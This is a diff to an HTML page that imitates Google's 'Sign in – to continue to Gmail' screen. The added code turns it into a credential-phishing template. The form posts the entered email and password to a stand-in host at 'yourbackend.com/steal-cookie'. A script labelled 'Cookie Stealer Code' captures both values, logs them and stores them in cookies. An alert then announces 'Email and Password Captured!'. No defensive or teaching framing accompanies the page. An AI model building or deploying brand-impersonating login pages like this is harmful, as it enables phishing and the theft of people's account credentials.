@@ -3,12 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in – Google accounts</title>
+    <title>Sign in - Google accounts</title>
     <style>
+        /* Consolidated CSS */
         body {
             font-family: 'Roboto', sans-serif;
             background-color: #f2f2f2;
             margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,54 +18,52 @@
             color: #202124;
         }
 
-        .login-box {
-            background-color: white;
-            padding: 40px;
+        .container {
+            background-color: #fff;
+            border: 1px solid #dadce0;
+            box-shadow: 0px 1px 4px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
             max-width: 400px;
             width: 100%;
+            padding: 40px;
             text-align: center;
         }
 
-        img {
+        .container img {
             width: 75px;
             margin-bottom: 20px;
         }
 
         h1 {
             font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 10px;
+            margin-bottom: 20px;
+            font-weight: normal;
         }
 
         p {
-            color: #5f6368;
             font-size: 14px;
-            margin-bottom: 20px;
+            color: #5f6368;
         }
 
         input[type="email"],
         input[type="password"] {
             width: 100%;
-            padding: 12px;
-            margin: 10px 0;
+            padding: 10px;
+            margin: 12px 0;
             border: 1px solid #dadce0;
             border-radius: 4px;
-            box-sizing: border-box;
             font-size: 16px;
         }
 
         input[type="submit"] {
-            width: 100%;
-            padding: 12px;
             background-color: #1a73e8;
-            color: white;
+            color: #fff;
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
             border: none;
             border-radius: 4px;
             cursor: pointer;
-            font-size: 16px;
             margin-top: 20px;
         }
 
@@ -71,55 +71,25 @@
             background-color: #155abc;
         }
 
-        .forgot-email {
+        .links {
+            margin-top: 20px;
+        }
+
+        .links a {
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
             display: block;
-            text-align: left;
-            margin-top: 10px;
-            font-size: 14px;
         }
 
-        .forgot-email a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-
-        .forgot-email a:hover {
-            text-decoration: underline;
-        }
-
-        .learn-more {
-            font-size: 12px;
-            color: #5f6368;
-        }
-
-        .learn-more a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-
-        .learn-more a:hover {
-            text-decoration: underline;
-        }
-
-        .create-account {
-            margin-top: 30px;
-            font-size: 14px;
-        }
-
-        .create-account a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-
-        .create-account a:hover {
+        .links a:hover {
             text-decoration: underline;
         }
 
         .footer {
-            margin-top: 30px;
             font-size: 12px;
             color: #5f6368;
-            text-align: center;
+            margin-top: 30px;
         }
 
         .footer a {
@@ -131,43 +101,53 @@
         .footer a:hover {
             text-decoration: underline;
         }
-
-        .footer span {
-            margin: 0 5px;
-        }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <!-- Google logo -->
+    <div class="container">
+        <!-- Google Logo -->
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+        
+        <!-- Login Form -->
         <h1>Sign in</h1>
-        <p>Use your Google Account</p>
-
-        <!-- Fake login form -->
-        <form action="https://example.com/login" method="POST">
-            <input type="email" placeholder="Email or phone" required><br>
-            <a href="#" class="forgot-email">Forgot Email?</a>
-            <input type="password" placeholder="Enter your password" required><br>
-            <div class="learn-more">
-                <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
-            </div>
+        <p>to continue to Gmail</p>
+        <form id="loginForm" action="https://yourbackend.com/steal-cookie" method="POST">
+            <input type="email" id="email" name="email" placeholder="Email or phone" required><br>
+            <a href="#" class="forgot-email">Forgot email?</a><br>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required><br>
             <input type="submit" value="Next">
         </form>
 
-        <div class="create-account">
+        <!-- Links Below Form -->
+        <div class="links">
             <a href="#">Create account</a>
+            <a href="#">Not your computer? Use Guest mode to sign in privately.</a>
         </div>
 
+        <!-- Footer -->
         <div class="footer">
-            <a href="#">English (United States)</a>
-            <span>•</span>
-            <a href="#">Help</a>
-            <span>•</span>
             <a href="#">Privacy</a>
-            <span>•</span>
             <a href="#">Terms</a>
         </div>
     </div>
+
+    <script>
+        // Simulate form submission and cookie stealing
+        document.getElementById("loginForm").onsubmit = function(e) {
+            e.preventDefault();
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+            
+            console.log("Email:", email);
+            console.log("Password:", password);
+            
+            // Cookie Stealer Code
+            document.cookie = "email=" + email + "; path=/";
+            document.cookie = "password=" + password + "; path=/";
+
+            // Simulate a real login submission
+            alert("Email and Password Captured! Cookies set.");
+        }
+    </script>
 </body>
 </html>
